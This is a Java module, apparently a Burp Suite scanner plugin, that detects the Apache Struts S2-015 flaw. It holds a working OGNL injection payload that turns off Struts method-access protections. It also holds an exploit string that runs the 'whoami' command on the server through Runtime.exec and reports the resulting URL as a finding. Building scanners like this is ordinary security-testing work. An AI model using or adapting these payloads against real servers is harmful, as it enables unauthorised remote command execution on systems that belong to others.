package module;

import burp.*;

import java.io.PrintWriter;
import java.net.URL;
import java.net.URLEncoder;

public class S2_015 extends IModule {
    public S2_015() {
        poc =
            "${" +
            "#context['xwork.MethodAccessor.denyMethodExecution']=false," +
            "#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')," +
            "#m.setAccessible(true)," +
            "#m.set(#_memberAccess,true)," +
            "#a='" + injectMark[0] + "'," +
            "#b='" + injectMark[1] + "'," +
            "#q=#a+#b," +
            "#q" +
            "}";
        poc = URLEncoder.encode(poc);

        exp =
            "${" +
            "#context['xwork.MethodAccessor.denyMethodExecution']=false," +
            "#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')," +
            "#m.setAccessible(true)," +
            "#m.set(#_memberAccess,true)," +
            "#cmd='whoami'," +
            "#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#cmd).getInputStream())," +
            "#q" +
            "}";
        exp = URLEncoder.encode(exp);
    }

    @Override
    public IScanIssue start() {
        PrintWriter stderr = new PrintWriter(callbacks.getStderr(), true);
        String url = requestInfo.getUrl().toString();
        String[] tmp = url.split("/");
        String fileName = tmp[tmp.length - 1];

        String[] extensions = new String[]{".action", ".do"};
        for (String ext: extensions) {
            if (fileName.endsWith(ext)) {
                String newFileName = poc + ext;
                String newUrl = url.replace(fileName, newFileName);
                try {
                    request = helpers.buildHttpRequest(new URL(newUrl));
                    if (check()) {
                        this.detail = url.replace(fileName, exp+ext);
                        return creatCustomScanIssue();
                    }
                } catch (Exception e) {
                    stderr.println(e.getMessage());
                }
            }
        }

        return null;
    }
}
